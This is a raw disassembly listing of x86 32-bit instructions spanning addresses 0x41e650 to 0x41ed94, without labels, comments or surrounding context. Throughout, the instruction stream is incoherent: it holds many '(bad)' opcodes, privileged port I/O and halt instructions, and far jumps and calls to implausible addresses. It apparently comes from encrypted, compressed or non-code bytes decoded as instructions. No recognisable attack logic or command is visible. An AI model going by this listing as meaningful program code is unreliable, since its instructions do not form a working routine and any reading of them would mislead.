  41e650:	xor    DWORD PTR [ecx],eax
  41e652:	jmp    esp
  41e654:	cli    
  41e655:	test   esi,edx
  41e657:	std    
  41e658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e659:	mov    eax,0x28483aff
  41e65e:	sub    ebx,DWORD PTR [ecx]
  41e660:	pop    ss
  41e661:	popf   
  41e662:	sbb    al,0xfe
  41e664:	ins    BYTE PTR es:[edi],dx
  41e665:	sbb    eax,0x8dc521a7
  41e66a:	fmul   DWORD PTR [ecx+eiz*4+0x67f2081e]
  41e671:	sbb    DWORD PTR [ebp+0x6cd641aa],ebx
  41e677:	or     esp,0xffffffa0
  41e67a:	xor    al,0xbe
  41e67c:	xchg   ebx,edi
  41e67e:	mov    edi,0x908fc089
  41e683:	or     edx,edi
  41e685:	fidiv  DWORD PTR [edx+0x2a4e2a05]
  41e68b:	jg     0x41e6be
  41e68d:	aam    0xd4
  41e68f:	retf   0x57a2
  41e692:	das    
  41e693:	mov    eax,0xce97023e
  41e698:	stc    
  41e699:	aas    
  41e69a:	xlat   BYTE PTR ds:[ebx]
  41e69b:	mov    eax,ds:0xa61dbe0f
  41e6a0:	pop    esi
  41e6a1:	bound  ebp,QWORD PTR [ecx]
  41e6a3:	(bad)  
  41e6a4:	mov    esi,DWORD PTR [edi-0x2938bc5a]
  41e6aa:	or     eax,DWORD PTR [ecx-0x77]
  41e6ad:	cdq    
  41e6ae:	cwde   
  41e6af:	jae    0x41e6dc
  41e6b1:	call   0x85a541c9
  41e6b6:	lods   al,BYTE PTR ds:[esi]
  41e6b7:	sbb    edi,DWORD PTR [ecx]
  41e6b9:	or     eax,0xf16f6998
  41e6be:	mov    edi,DWORD PTR [ebx]
  41e6c0:	xlat   BYTE PTR ds:[ebx]
  41e6c1:	imul   edx,esi,0x78
  41e6c4:	out    0x0,eax
  41e6c6:	hlt    
  41e6c7:	mov    ds:0x7d7ac9e9,eax
  41e6cc:	cdq    
  41e6cd:	sbb    ebp,esi
  41e6cf:	jmp    0xfd47:0x2a674032
  41e6d6:	jg     0x41e6eb
  41e6d8:	jnp    0x41e6dd
  41e6da:	inc    ecx
  41e6db:	pusha  
  41e6dc:	loop   0x41e6ce
  41e6de:	mov    al,0x2a
  41e6e0:	scas   al,BYTE PTR es:[edi]
  41e6e1:	aas    
  41e6e2:	mov    edi,0x791dc02a
  41e6e7:	shl    DWORD PTR [edi],0xd9
  41e6ea:	mov    bh,BYTE PTR [ecx]
  41e6ec:	dec    ebp
  41e6ed:	nop
  41e6ee:	sbb    bh,0x9d
  41e6f1:	(bad)  
  41e6f2:	cli    
  41e6f3:	pop    esi
  41e6f4:	out    dx,al
  41e6f5:	dec    ecx
  41e6f6:	pop    esp
  41e6f7:	outs   dx,DWORD PTR ds:[esi]
  41e6f8:	jecxz  0x41e713
  41e6fa:	sbb    al,0x8a
  41e6fc:	test   eax,0xb35449a2
  41e701:	ficomp DWORD PTR [bp+si+0x1a]
  41e705:	mov    dl,0x23
  41e707:	xor    esi,DWORD PTR [ebp+0x2f]
  41e70a:	js     0x41e764
  41e70c:	jno    0x41e78d
  41e70e:	ds inc esi
  41e710:	test   DWORD PTR [eax+0x35846411],ebx
  41e716:	fstp   TBYTE PTR [edx-0x52db7be0]
  41e71c:	push   0x5a229073
  41e721:	cdq    
  41e722:	mov    WORD PTR [ecx-0x7c],es
  41e725:	cli    
  41e726:	sbb    dh,0x39
  41e729:	lds    ecx,FWORD PTR [edi]
  41e72b:	(bad)  
  41e72c:	loopne 0x41e716
  41e72e:	mov    dh,BYTE PTR [ebx]
  41e730:	dec    ecx
  41e731:	fisttp WORD PTR ds:0x319075ca
  41e737:	ss cwde 
  41e739:	sbb    al,0xc5
  41e73b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e73c:	or     al,BYTE PTR [ecx]
  41e73e:	mov    edx,0xcb8d3610
  41e743:	or     DWORD PTR [ebp-0x3f],ecx
  41e746:	or     eax,0x533ac451
  41e74b:	mov    ebx,0x82380ede
  41e750:	fdivr  st,st(2)
  41e752:	mov    ds:0x27c1471f,eax
  41e757:	jnp    0x41e746
  41e759:	dec    ecx
  41e75a:	jae    0x41e74b
  41e75c:	or     ebx,esi
  41e75e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e75f:	in     al,dx
  41e760:	jge    0x41e768
  41e762:	xor    edx,DWORD PTR [edx-0x1]
  41e765:	and    edi,DWORD PTR [edx]
  41e767:	jo     0x41e72b
  41e769:	pop    ebx
  41e76a:	sahf   
  41e76b:	xchg   esi,eax
  41e76c:	xchg   edx,eax
  41e76d:	jge    0x41e7c5
  41e76f:	jge    0x41e6f4
  41e771:	and    ecx,DWORD PTR [esi-0x7f]
  41e774:	stc    
  41e775:	ret    
  41e776:	in     al,0xad
  41e778:	retf   
  41e779:	cmp    eax,0x1e398a2
  41e77e:	sub    ah,BYTE PTR [esi+0x4]
  41e781:	push   esp
  41e782:	sahf   
  41e783:	outs   dx,DWORD PTR ds:[esi]
  41e784:	xor    dh,BYTE PTR [ebx+0x4a]
  41e787:	aad    0xbd
  41e789:	rol    DWORD PTR [ecx+0x5c],cl
  41e78c:	mov    edi,0x64ce4590
  41e791:	sub    esp,0x28d8a793
  41e797:	in     al,0xef
  41e799:	add    DWORD PTR [ebx-0x39],0x18
  41e79d:	xor    DWORD PTR [edi],0x7891f3bb
  41e7a3:	push   0x99d289f0
  41e7a8:	in     al,dx
  41e7a9:	test   BYTE PTR [ebp-0x12d0c27a],bh
  41e7af:	ins    DWORD PTR es:[edi],dx
  41e7b0:	mov    ds:0x1bbff583,al
  41e7b5:	pop    edx
  41e7b6:	ins    DWORD PTR es:[edi],dx
  41e7b7:	mov    ?,WORD PTR [ebp-0x3e]
  41e7ba:	popa   
  41e7bb:	test   eax,0x46bbd8fd
  41e7c0:	xlat   BYTE PTR ds:[ebx]
  41e7c1:	jmp    0xfa30ad65
  41e7c6:	mov    eax,fs:0xd076889b
  41e7cc:	push   ss
  41e7cd:	xor    al,0x83
  41e7cf:	xor    dl,0x2f
  41e7d2:	fs ss out 0xaf,al
  41e7d6:	in     al,0xb9
  41e7d8:	mov    esi,0x375c143d
  41e7dd:	cs stos DWORD PTR es:[edi],eax
  41e7df:	cld    
  41e7e0:	sub    DWORD PTR [ebx-0x3],0xa
  41e7e4:	pop    es
  41e7e5:	loop   0x41e7d7
  41e7e7:	enter  0x9a25,0x7a
  41e7eb:	or     al,BYTE PTR [eax]
  41e7ed:	fadd   DWORD PTR [ebx+0x21]
  41e7f0:	ret    0xa2f5
  41e7f3:	inc    edi
  41e7f4:	push   eax
  41e7f5:	ss xchg esi,eax
  41e7f7:	mov    ecx,0x5649f054
  41e7fc:	jnp    0x41e820
  41e7fe:	dec    edx
  41e7ff:	out    0x46,eax
  41e801:	sub    BYTE PTR [esi-0x18f17d65],bl
  41e807:	lods   eax,DWORD PTR ds:[esi]
  41e808:	into   
  41e809:	add    al,0x6c
  41e80b:	test   al,0x69
  41e80d:	inc    esi
  41e80e:	sbb    DWORD PTR [esi-0x57],0xffffffa5
  41e812:	hlt    
  41e813:	add    eax,0xe0f1af32
  41e818:	addr16 retf 
  41e81a:	sub    al,BYTE PTR [esi+0x38]
  41e81d:	mov    cl,0x49
  41e81f:	mov    DWORD PTR [ebx-0x51],esi
  41e822:	jb     0x41e85c
  41e824:	sub    dl,BYTE PTR [esi+0x5732eb8]
  41e82a:	ins    BYTE PTR es:[edi],dx
  41e82b:	dec    esi
  41e82c:	cmp    eax,0x89be2bd5
  41e831:	in     al,dx
  41e832:	push   ss
  41e833:	adc    DWORD PTR [edi+0x7de72906],0x7bca253a
  41e83d:	dec    ebx
  41e83e:	add    DWORD PTR [esi],0x1d5cb9ef
  41e844:	push   edi
  41e845:	call   0xbce6cc5e
  41e84a:	popa   
  41e84b:	imul   ebp,DWORD PTR [ebx],0x18
  41e84e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e850:	retf   
  41e851:	push   es
  41e852:	pop    ebx
  41e853:	(bad)  
  41e854:	(bad)  
  41e855:	mov    bl,0x14
  41e857:	xor    DWORD PTR [eax+0x59],0xf2bc71b2
  41e85e:	out    0x52,al
  41e860:	mov    ecx,0xbd8ccc28
  41e865:	pop    ecx
  41e866:	outs   dx,BYTE PTR ds:[esi]
  41e867:	or     BYTE PTR ds:0x4d48147,ah
  41e86d:	out    0xa1,eax
  41e86f:	inc    ebp
  41e870:	mov    al,0x19
  41e872:	and    BYTE PTR [esi-0x7c],dh
  41e875:	mov    esi,0x9dda210c
  41e87a:	shl    BYTE PTR [edi-0x37d021af],1
  41e880:	retf   
  41e881:	or     DWORD PTR [esp+ebp*2],edi
  41e884:	adc    esi,DWORD PTR [eax]
  41e886:	add    edx,DWORD PTR [edi+0x2c]
  41e889:	gs mov al,0x43
  41e88c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e88d:	or     esi,DWORD PTR [eax]
  41e88f:	inc    ebx
  41e890:	aaa    
  41e891:	and    al,0xa4
  41e893:	pushf  
  41e894:	mov    BYTE PTR [edx-0x7d4b1982],bl
  41e89a:	add    cl,BYTE PTR ds:[edx]
  41e89d:	nop
  41e89e:	js     0x41e90c
  41e8a0:	loope  0x41e8dc
  41e8a2:	out    0x33,al
  41e8a4:	jg     0x41e868
  41e8a6:	pop    es
  41e8a7:	fsub   QWORD PTR [ebp+0x79d3ae75]
  41e8ad:	add    ax,0x5cd9
  41e8b1:	test   DWORD PTR [eax-0x5d],ecx
  41e8b4:	test   eax,0x8f33fed2
  41e8b9:	mov    dh,0xe2
  41e8bb:	jmp    0xcbb134fd
  41e8c0:	xchg   esp,eax
  41e8c1:	int    0x6d
  41e8c3:	int3   
  41e8c4:	daa    
  41e8c5:	pop    es
  41e8c6:	mov    eax,ds:0x800d555
  41e8cb:	and    al,0xd0
  41e8cd:	pusha  
  41e8ce:	pop    edx
  41e8cf:	or     eax,edx
  41e8d1:	sub    eax,0x57e9b08b
  41e8d6:	ficomp DWORD PTR [eax]
  41e8d8:	mov    dh,0xb3
  41e8da:	sbb    al,BYTE PTR [ebp-0x6f]
  41e8dd:	xchg   ecx,eax
  41e8de:	leave  
  41e8df:	jmp    0x41e880
  41e8e1:	or     bl,bh
  41e8e3:	push   0x4be48106
  41e8e8:	dec    edi
  41e8e9:	mov    ebp,0xe36944fb
  41e8ee:	mov    ss,WORD PTR [ebp-0x25f85d08]
  41e8f4:	repnz or BYTE PTR [ebx+eax*2],bl
  41e8f8:	retf   
  41e8f9:	push   eax
  41e8fa:	loop   0x41e927
  41e8fc:	fidiv  WORD PTR [edx-0xb]
  41e8ff:	xchg   ecx,eax
  41e900:	shl    DWORD PTR [edx],0x7
  41e903:	mov    dl,0xd3
  41e905:	arpl   sp,si
  41e907:	(bad)  
  41e908:	push   ebp
  41e909:	mov    bh,0xa4
  41e90b:	inc    eax
  41e90c:	ins    DWORD PTR es:[edi],dx
  41e90d:	iret   
  41e90e:	fprem  
  41e910:	lds    ecx,FWORD PTR [eax+0x3a]
  41e913:	jg     0x41e8d9
  41e915:	jo     0x41e98c
  41e917:	ins    BYTE PTR es:[edi],dx
  41e918:	fcmovbe st,st(3)
  41e91a:	dec    esi
  41e91b:	mov    esp,0xb9ad0941
  41e920:	mov    edx,0xe4694447
  41e925:	out    0x4f,eax
  41e927:	enter  0x7d91,0xb5
  41e92b:	push   ecx
  41e92c:	call   0xd9fa:0x7e1b8bc8
  41e933:	mov    ?,WORD PTR [ecx]
  41e935:	and    eax,0x1e39d23a
  41e93a:	icebp  
  41e93b:	jl     0x41e914
  41e93d:	and    eax,DWORD PTR [eax]
  41e93f:	inc    edi
  41e940:	push   0xffffff83
  41e942:	dec    edi
  41e943:	or     al,0x87
  41e945:	push   esp
  41e946:	cmp    DWORD PTR [edx+0xb],esp
  41e949:	sbb    eax,0xc5fbe813
  41e94e:	add    BYTE PTR [esi],al
  41e950:	xchg   esi,eax
  41e951:	je     0x41e907
  41e953:	pop    es
  41e954:	jo     0x41e98c
  41e956:	xchg   esp,eax
  41e957:	add    BYTE PTR [edx],cl
  41e959:	or     eax,0x16a28440
  41e95e:	lods   eax,DWORD PTR ds:[esi]
  41e95f:	sbb    al,cl
  41e961:	pop    ds
  41e962:	push   edi
  41e963:	imul   esi,ecx,0x1bc6398d
  41e969:	aad    0x9a
  41e96b:	pop    esi
  41e96c:	mov    cl,0x7
  41e96e:	and    al,0x20
  41e970:	add    al,0xd0
  41e972:	mov    DWORD PTR [esi-0x13fcef5f],eax
  41e978:	sbb    DWORD PTR [bp+si+0x2f99],0x6568f53b
  41e981:	nop
  41e982:	pop    edx
  41e983:	punpcklwd mm6,DWORD PTR [edx-0x42]
  41e987:	xchg   ebx,eax
  41e988:	imul   eax,DWORD PTR [eax+0x4a],0xa7965d2
  41e98f:	mov    bl,0x7f
  41e991:	adc    BYTE PTR [ebx+0x72],dh
  41e994:	push   esi
  41e995:	loopne 0x41e9dc
  41e997:	or     esi,DWORD PTR [ecx-0x75]
  41e99a:	(bad)
  41e99d:	jmp    0x41e9b3
  41e99f:	xor    eax,0xedf22fcb
  41e9a4:	outs   dx,DWORD PTR ds:[esi]
  41e9a5:	push   ss
  41e9a6:	rcr    BYTE PTR [edi+ebx*4-0x2],cl
  41e9aa:	mov    ecx,0xfa21f963
  41e9af:	ja     0x41e9e2
  41e9b1:	add    eax,0xfb7808a9
  41e9b6:	pop    edx
  41e9b7:	xor    eax,0xd5c2a27e
  41e9bc:	shl    DWORD PTR [ecx],1
  41e9be:	sub    esp,0xffffffb6
  41e9c1:	and    esp,DWORD PTR [ebx]
  41e9c3:	lods   eax,DWORD PTR ds:[esi]
  41e9c4:	jne    0x41e9cd
  41e9c6:	dec    ecx
  41e9c7:	dec    edx
  41e9c8:	push   0xffffff88
  41e9ca:	mov    ch,0xcf
  41e9cc:	jmp    0x41ea0e
  41e9ce:	adc    ebp,DWORD PTR [eax-0x73]
  41e9d1:	imul   ebp,ebp,0xffffffda
  41e9d4:	adc    ebp,DWORD PTR [esi+0x5c]
  41e9d7:	add    eax,0x898fc9e6
  41e9dc:	push   ecx
  41e9dd:	call   0x446d8e4a
  41e9e2:	popf   
  41e9e3:	into   
  41e9e4:	jmp    0x2337b64d
  41e9e9:	cmc    
  41e9ea:	sub    al,BYTE PTR [eax+0x629d129a]
  41e9f0:	xor    al,0x44
  41e9f2:	xchg   DWORD PTR [esi+0x2c396dd1],ecx
  41e9f8:	arpl   WORD PTR [ecx+ecx*8],bx
  41e9fb:	lahf   
  41e9fc:	cmp    esp,DWORD PTR [ebp-0x53b8d748]
  41ea02:	stos   BYTE PTR es:[edi],al
  41ea03:	and    ebp,DWORD PTR [edx-0x61]
  41ea06:	mov    ebx,0x421ca65d
  41ea0b:	ror    DWORD PTR [ebx-0x1e],1
  41ea0e:	dec    eax
  41ea0f:	cwde   
  41ea10:	jae    0x41ea0f
  41ea12:	sbb    BYTE PTR [ecx],bh
  41ea14:	into   
  41ea15:	stos   DWORD PTR es:[edi],eax
  41ea16:	xchg   edi,eax
  41ea17:	sbb    BYTE PTR [eax+0x3a],bh
  41ea1a:	out    0x23,eax
  41ea1c:	fisubr DWORD PTR [ebp+0x69c0b0b5]
  41ea22:	push   edi
  41ea23:	lahf   
  41ea24:	icebp  
  41ea25:	aad    0xd
  41ea27:	fidiv  WORD PTR [ecx*2+0x3224bc73]
  41ea2e:	retf   0x34aa
  41ea31:	sahf   
  41ea32:	push   esi
  41ea33:	or     DWORD PTR [edi],0x55
  41ea36:	bound  eax,QWORD PTR [edi-0x591660d7]
  41ea3c:	imul   esp,DWORD PTR [ebx-0x7b],0x53
  41ea40:	add    al,0x8f
  41ea42:	int3   
  41ea43:	and    al,0xd3
  41ea45:	rol    DWORD PTR [ebx+0x53],0x47
  41ea49:	push   esp
  41ea4a:	adc    DWORD PTR [esi+0x39],eax
  41ea4d:	mov    bh,0x74
  41ea4f:	enter  0x7c8c,0x59
  41ea53:	pop    esi
  41ea54:	loope  0x41ea1f
  41ea56:	(bad)  
  41ea57:	hlt    
  41ea58:	cld    
  41ea59:	jne    0x41ea88
  41ea5b:	gs sub ch,dh
  41ea5e:	stc    
  41ea5f:	mov    edi,0x47a8aacd
  41ea64:	xlat   BYTE PTR ds:[ebx]
  41ea65:	int3   
  41ea66:	xchg   DWORD PTR [esi-0x59],edi
  41ea69:	int    0xd6
  41ea6b:	cmp    DWORD PTR [edi-0x64906e5d],ebx
  41ea71:	aaa    
  41ea72:	xchg   edi,eax
  41ea73:	and    eax,0xc005c8b4
  41ea78:	mov    es,WORD PTR [edx+ebx*2]
  41ea7b:	dec    edi
  41ea7c:	pop    ss
  41ea7d:	aaa    
  41ea7e:	mov    ch,0xc1
  41ea80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea81:	inc    ebx
  41ea82:	iret   
  41ea83:	inc    ebp
  41ea84:	jle    0x41ea33
  41ea86:	loope  0x41eb07
  41ea88:	pop    eax
  41ea89:	or     esp,edx
  41ea8b:	sbb    esi,esp
  41ea8d:	das    
  41ea8e:	enter  0xfb8b,0xbd
  41ea92:	jl     0x41eb0c
  41ea94:	pop    ebp
  41ea95:	xchg   edi,eax
  41ea96:	inc    ebp
  41ea97:	call   0x27cc:0x5b2b246a
  41ea9e:	mov    eax,ds:0x8a477c8f
  41eaa3:	arpl   WORD PTR ds:0x5802dd83,si
  41eaa9:	mov    edx,0xc4b0b715
  41eaae:	fwait
  41eaaf:	mov    eax,0xa9853700
  41eab4:	daa    
  41eab5:	sub    DWORD PTR [ebp-0x17],ebp
  41eab8:	arpl   WORD PTR [edx-0x284befdb],sp
  41eabe:	pop    ss
  41eabf:	enter  0xa31e,0xb9
  41eac3:	in     al,0x7e
  41eac5:	ret    0xcc81
  41eac8:	mov    bh,0xed
  41eaca:	in     al,dx
  41eacb:	mov    ds:0x71a37c78,eax
  41ead0:	adc    bh,bh
  41ead2:	push   ebx
  41ead3:	xor    bl,dl
  41ead5:	fcomp  QWORD PTR [ebp+0x7751a999]
  41eadb:	xor    esp,ecx
  41eadd:	push   edx
  41eade:	push   edi
  41eadf:	aaa    
  41eae0:	or     esi,ecx
  41eae2:	xchg   DWORD PTR [eax+0x27b55841],edi
  41eae8:	mov    al,0xb3
  41eaea:	(bad)  
  41eaec:	cwde   
  41eaed:	mov    bl,0x31
  41eaef:	jg     0x41eb14
  41eaf1:	mov    bh,cl
  41eaf3:	ds or  cl,dh
  41eaf6:	mov    al,BYTE PTR [ebx]
  41eaf8:	inc    esp
  41eaf9:	jns    0x41eb42
  41eafb:	or     ebx,DWORD PTR [esi+0x5c]
  41eafe:	cs xchg ecx,eax
  41eb00:	mov    edx,0x74a2e63
  41eb05:	push   0xffffffc4
  41eb07:	cs mov ecx,0xb23a97e4
  41eb0d:	dec    edi
  41eb0e:	and    cl,BYTE PTR [ebx]
  41eb10:	imul   ebx,DWORD PTR [eax],0xc457fcf4
  41eb16:	mov    cs,WORD PTR [ebx]
  41eb18:	push   ebx
  41eb19:	sub    BYTE PTR [eax+0x77],0x1d
  41eb1d:	dec    esi
  41eb1e:	inc    ecx
  41eb1f:	ja     0x41eb4a
  41eb21:	xlat   BYTE PTR ds:[ebx]
  41eb22:	shr    edi,0x30
  41eb25:	aad    0x77
  41eb27:	arpl   WORD PTR [ecx],dx
  41eb29:	lds    esi,FWORD PTR [ebx+eiz*8+0x3c74e8b6]
  41eb30:	sub    DWORD PTR [esi+0x0],0xffffff8c
  41eb34:	mov    edi,0x26d9c3f5
  41eb39:	push   ebx
  41eb3a:	push   ebx
  41eb3b:	ret    
  41eb3c:	sbb    eax,0x55341f7a
  41eb41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb42:	cs cmp al,0xf4
  41eb45:	fadd   DWORD PTR [eax+0x4c6d84f]
  41eb4b:	inc    edx
  41eb4c:	add    eax,0xe3aa2edc
  41eb51:	push   edi
  41eb52:	jecxz  0x41eb87
  41eb54:	lea    ebp,[ebx-0x5c]
  41eb57:	popa   
  41eb58:	xchg   ecx,eax
  41eb59:	jbe    0x41ebaa
  41eb5b:	fcomp  QWORD PTR [ebp-0x29]
  41eb5e:	getsec 
  41eb60:	popf   
  41eb61:	mov    dh,0x3f
  41eb63:	dec    ecx
  41eb64:	inc    edi
  41eb65:	std    
  41eb66:	dec    ecx
  41eb67:	mov    WORD PTR [esi+eiz*8],ss
  41eb6a:	pop    ebx
  41eb6b:	fnstenv [esi+0x3c]
  41eb6e:	ss xchg esp,eax
  41eb70:	sbb    BYTE PTR [edx],ah
  41eb72:	xchg   edx,eax
  41eb73:	inc    ebp
  41eb74:	jl     0x41eb5f
  41eb76:	and    esp,DWORD PTR [edx-0x3]
  41eb79:	mov    esp,?
  41eb7b:	cmp    ecx,eax
  41eb7d:	and    DWORD PTR [esi],esi
  41eb7f:	repz push esi
  41eb81:	cmp    BYTE PTR [edi-0x5ecb315f],bl
  41eb87:	stos   BYTE PTR es:[edi],al
  41eb88:	inc    edi
  41eb89:	call   0x8d83:0xb79f0024
  41eb90:	push   ecx
  41eb91:	jl     0x41eb9c
  41eb93:	xor    eax,0x952986df
  41eb98:	push   edx
  41eb99:	(bad)  
  41eb9a:	xchg   edi,eax
  41eb9b:	lods   al,BYTE PTR ds:[esi]
  41eb9c:	push   ebx
  41eb9d:	cs hlt 
  41eb9f:	sti    
  41eba0:	stos   DWORD PTR es:[edi],eax
  41eba1:	hlt    
  41eba2:	jg     0x41ebac
  41eba4:	pop    ds
  41eba5:	lea    edx,[eax+0x45f8834b]
  41ebab:	pop    esi
  41ebac:	mov    ebp,0xa67fc3b6
  41ebb1:	cmc    
  41ebb2:	jnp    0x41eb86
  41ebb4:	xor    ah,BYTE PTR [ecx+0x2d]
  41ebb7:	jno    0x41ec32
  41ebb9:	inc    eax
  41ebba:	xchg   edi,eax
  41ebbb:	push   eax
  41ebbc:	jmp    0x93eb:0x96ba8396
  41ebc3:	inc    esi
  41ebc4:	pop    esi
  41ebc5:	xchg   ebp,eax
  41ebc6:	loop   0x41ebac
  41ebc8:	add    eax,0xfd8c6683
  41ebcd:	gs push edx
  41ebcf:	or     al,0x90
  41ebd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebd2:	adc    BYTE PTR [ebx-0x3c],cl
  41ebd5:	mov    BYTE PTR [ebx-0x18],al
  41ebd8:	push   es
  41ebd9:	inc    ebx
  41ebda:	xchg   edx,eax
  41ebdb:	(bad)
  41ebdf:	iret   
  41ebe0:	sti    
  41ebe1:	fld    DWORD PTR [edx+eiz*4]
  41ebe4:	not    BYTE PTR [ebp-0xc]
  41ebe7:	int    0x41
  41ebe9:	in     al,dx
  41ebea:	xor    eax,DWORD PTR ds:0x461171b9
  41ebf0:	iret   
  41ebf1:	xor    eax,0x9f6671b7
  41ebf6:	adc    edi,ebx
  41ebf8:	neg    DWORD PTR [esi-0x32]
  41ebfb:	add    esp,DWORD PTR [ebp+0x7c]
  41ebfe:	jmp    FWORD PTR [ecx+0x47]
  41ec01:	and    eax,DWORD PTR [ebx+0x54e002d9]
  41ec07:	aaa    
  41ec08:	shr    BYTE PTR [edx+0x1a],0x27
  41ec0c:	sbb    DWORD PTR [edx-0x6d],0x2
  41ec10:	mov    ch,0xdf
  41ec12:	sub    edx,DWORD PTR [ebx-0x15]
  41ec15:	push   0xace59038
  41ec1a:	pusha  
  41ec1b:	push   esp
  41ec1c:	pop    esi
  41ec1d:	jnp    0x41ec27
  41ec1f:	push   esi
  41ec20:	xor    ecx,ebx
  41ec22:	cmp    eax,0x650c150d
  41ec27:	ss (bad) 
  41ec29:	retf   
  41ec2a:	nop
  41ec2b:	pop    ebx
  41ec2c:	popf   
  41ec2d:	dec    eax
  41ec2e:	push   cs
  41ec2f:	lds    esp,FWORD PTR [edi-0x3e]
  41ec32:	pop    ebp
  41ec33:	mov    si,0x4b36
  41ec37:	fwait
  41ec38:	rol    BYTE PTR [ebp-0x7f],cl
  41ec3b:	pop    ds
  41ec3c:	rcl    cl,0xe1
  41ec3f:	inc    eax
  41ec40:	pusha  
  41ec41:	aas    
  41ec42:	addr16 xchg ecx,eax
  41ec44:	sbb    DWORD PTR [ecx-0x15045d5c],edx
  41ec4a:	xchg   BYTE PTR [edx],al
  41ec4c:	fs stos DWORD PTR es:[edi],eax
  41ec4e:	ja     0x41ebf7
  41ec50:	push   ds
  41ec51:	jb     0x41ec4a
  41ec53:	lea    esp,[edi-0x3d]
  41ec56:	adc    edx,DWORD PTR [ecx]
  41ec58:	out    0x61,al
  41ec5a:	mov    bh,0x3e
  41ec5c:	and    ebp,edx
  41ec5e:	xchg   edx,eax
  41ec5f:	pushf  
  41ec60:	jp     0x41ec1b
  41ec62:	out    0xca,al
  41ec64:	cld    
  41ec65:	(bad)  
  41ec66:	ss (bad) 
  41ec68:	mov    edi,0x2ef695cd
  41ec6d:	enter  0x7700,0xf5
  41ec71:	out    0x4d,eax
  41ec73:	dec    esi
  41ec74:	stos   DWORD PTR es:[edi],eax
  41ec75:	fidiv  WORD PTR [eax-0x2a791d4c]
  41ec7b:	push   0x35
  41ec7d:	dec    ebx
  41ec7e:	(bad)  
  41ec7f:	mov    BYTE PTR [esi],0xc7
  41ec82:	mov    ch,0x55
  41ec84:	rcl    BYTE PTR [ebx+0x6d],1
  41ec87:	aam    0xfa
  41ec89:	cmp    al,0xdb
  41ec8b:	sub    al,0xa1
  41ec8d:	mov    ecx,ecx
  41ec8f:	dec    ebx
  41ec90:	sub    ecx,DWORD PTR [ecx]
  41ec92:	xchg   DWORD PTR [esi],edx
  41ec94:	arpl   si,dx
  41ec96:	jne    0x41ec3a
  41ec98:	gs jb  0x41ec5d
  41ec9b:	lods   eax,DWORD PTR ds:[esi]
  41ec9c:	loope  0x41ecfb
  41ec9e:	hlt    
  41ec9f:	test   al,0x20
  41eca1:	xchg   DWORD PTR [ecx-0x4a],ecx
  41eca4:	jno    0x41ed23
  41eca6:	mov    edx,0x9a755d74
  41ecab:	sbb    BYTE PTR fs:[edi],cl
  41ecae:	mov    cl,0xdb
  41ecb0:	add    DWORD PTR [eax],ebp
  41ecb2:	test   DWORD PTR [edi+0x54],esi
  41ecb5:	mov    ds:0x7b1da09,al
  41ecba:	aaa    
  41ecbb:	(bad)  
  41ecbc:	sbb    al,0xce
  41ecbe:	aas    
  41ecbf:	mov    ds:0xe2642294,eax
  41ecc4:	mov    al,0xca
  41ecc6:	inc    ecx
  41ecc7:	or     al,0xc6
  41ecc9:	(bad)  
  41eccb:	repnz and al,0x10
  41ecce:	cdq    
  41eccf:	mov    eax,ds:0xc332372c
  41ecd4:	adc    eax,0xb1085f7b
  41ecd9:	aam    0xd
  41ecdb:	call   0x81cdc2a7
  41ece0:	push   es
  41ece1:	lock in al,0x74
  41ece4:	jno    0x41ed30
  41ece6:	adc    bl,BYTE PTR [eax+0x48cefe40]
  41ecec:	fst    QWORD PTR [esi+0x68]
  41ecef:	les    eax,FWORD PTR [esi]
  41ecf1:	cmp    eax,0x47920758
  41ecf6:	fimul  WORD PTR [edx-0x30]
  41ecf9:	push   0xfb311852
  41ecfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecff:	mov    ds:0x2cd3f36a,al
  41ed04:	outs   dx,BYTE PTR ds:[esi]
  41ed05:	jge    0x41eceb
  41ed07:	lea    esi,[esi-0x522eb3fb]
  41ed0d:	and    ebp,DWORD PTR [edx-0x559bbd0f]
  41ed13:	popf   
  41ed14:	jge    0x41ed8b
  41ed16:	add    edx,0xb2d184ef
  41ed1c:	pop    eax
  41ed1d:	push   eax
  41ed1e:	and    BYTE PTR [ebx],0x4
  41ed21:	mov    ebp,0x32e16e3f
  41ed26:	fidivr DWORD PTR [ebx-0xe]
  41ed29:	pop    ebp
  41ed2a:	mov    al,0xb2
  41ed2c:	and    DWORD PTR [eax+0x1d72bfbd],ebx
  41ed32:	enter  0x6a78,0x5b
  41ed36:	retf   
  41ed37:	fcomp  DWORD PTR [esi]
  41ed39:	out    dx,al
  41ed3a:	or     al,0x55
  41ed3c:	retf   0x5f4b
  41ed3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed40:	jp     0x41ed6c
  41ed42:	out    dx,al
  41ed43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed44:	in     eax,dx
  41ed45:	jb     0x41ed99
  41ed47:	or     DWORD PTR [ecx-0x50c6aafc],esp
  41ed4d:	xlat   BYTE PTR ds:[ebx]
  41ed4e:	(bad)  
  41ed4f:	jg     0x41ed70
  41ed51:	mov    es,WORD PTR [ecx-0x638b8fe1]
  41ed57:	cwde   
  41ed58:	ss inc esp
  41ed5a:	in     eax,0x76
  41ed5c:	xor    al,0x51
  41ed5e:	(bad)  
  41ed61:	(bad)  
  41ed62:	in     eax,dx
  41ed63:	ret    0xa667
  41ed66:	bnd jg 0x41eda7
  41ed69:	xchg   ebx,eax
  41ed6a:	bound  ebp,QWORD PTR [edi]
  41ed6c:	ror    BYTE PTR [edx-0xbc532e3],0xff
  41ed73:	push   ebp
  41ed74:	dec    edi
  41ed75:	clc    
  41ed76:	adc    DWORD PTR [edx-0x75],edi
  41ed79:	add    DWORD PTR [esi-0x50],esp
  41ed7c:	out    0x7b,al
  41ed7e:	adc    eax,0x43dc779d
  41ed83:	pop    edx
  41ed84:	aaa    
  41ed85:	inc    edi
  41ed86:	lea    edi,[ecx+0x7]
  41ed89:	push   es
  41ed8a:	call   DWORD PTR [edi+edi*1+0x52]
  41ed8e:	and    DWORD PTR [esi+0x545e453e],ebp
  41ed94:	dec    esi
